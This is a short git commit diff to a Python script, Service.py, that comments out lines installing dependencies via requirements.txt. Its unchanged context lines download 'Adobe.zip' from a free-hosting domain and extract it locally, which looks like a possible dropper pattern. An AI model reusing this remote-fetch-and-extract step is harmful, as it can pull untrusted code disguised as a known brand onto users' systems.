646e6eb12478b23df066f5c0bc7c296a49a245f9
Sayak Naskar <sayaknaskar@gmail.com>
2019-05-21 14:24:12 +0530

    Update Service.py

--- Service.py
+++ Service.py
@@ -7,10 +7,10 @@ url = "https://separable-oxygen.000webhostapp.com/Adobe.zip"
 wget.download(url)
 Archive('Adobe.zip').extractall('.')
 
-os.system("echo.>requirements.txt")
-os.system("echo pyunpack > requirements.txt")
-os.system("echo wget >> requirements.txt")
-os.system("timeout 5")
-os.system("pip install -r requirements.txt")
+# os.system("echo.>requirements.txt")
+# os.system("echo pyunpack > requirements.txt")
+# os.system("echo wget >> requirements.txt")
+# os.system("timeout 5")
+# os.system("pip install -r requirements.txt")
 
 
